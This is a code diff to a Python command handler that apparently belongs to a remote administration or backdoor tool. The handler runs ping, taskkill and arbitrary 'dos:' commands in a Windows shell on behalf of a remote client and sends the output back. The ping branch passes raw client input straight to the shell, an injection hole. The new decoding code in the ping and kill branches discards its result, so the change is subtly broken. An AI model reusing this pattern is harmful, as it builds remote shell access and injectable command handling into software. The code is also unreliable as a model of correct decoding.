@@ -22,26 +22,38 @@ def windows(client, cmd, cmd_split, data, args):
     elif cmd == 'ping':
         if args:
             client.send('Trying to ping at ' + data.split(' ', 1)[1] + '...')
-            process = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='utf-8', shell=True)
+            process = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
             output = process.stdout.read()
             if len(output) == 0:
                 output = process.stderr.read()
+            try:
+                output.decode('utf-8')
+            except:
+                output.decode('cp850')
         else:
             output = 'Usage : ping <DESTINATION>'
         client.send(output)
     elif cmd == 'kill':
         if args:
-            output = subprocess.check_output('taskkill /F /IM ' + cmd_split[1] + ' /T', shell=True).decode()
+            output = subprocess.check_output('taskkill /F /IM ' + cmd_split[1] + ' /T', shell=True)
+            try:
+                output.decode('utf-8')
+            except:
+                output.decode('cp850')
             client.send(output)
     elif cmd[0:4] == 'dos:':
         command = data.split(':', 1)[1]
         if len(command) == 0:
             client.send('Usage : dos:<COMMAND>')
             return
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='utf-8', shell=True)
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         output = process.stdout.read()
         if len(output) == 0:
             output = process.stderr.read()
+        try:
+            output = output.decode('utf-8')
+        except:
+            output = output.decode('cp850')
         if len(output) == 0:
             output = 'success'
         client.send(output)
@@ -55,6 +67,10 @@ def windows(client, cmd, cmd_split, data, args):
         output = process.stdout.read()
         if len(output) == 0:
             output = process.stderr.read()
+        try:
+            output = output.decode('utf-8')
+        except:
+            output = output.decode('cp850')
         if len(output) == 0:
             output = 'success'
         client.send(output)
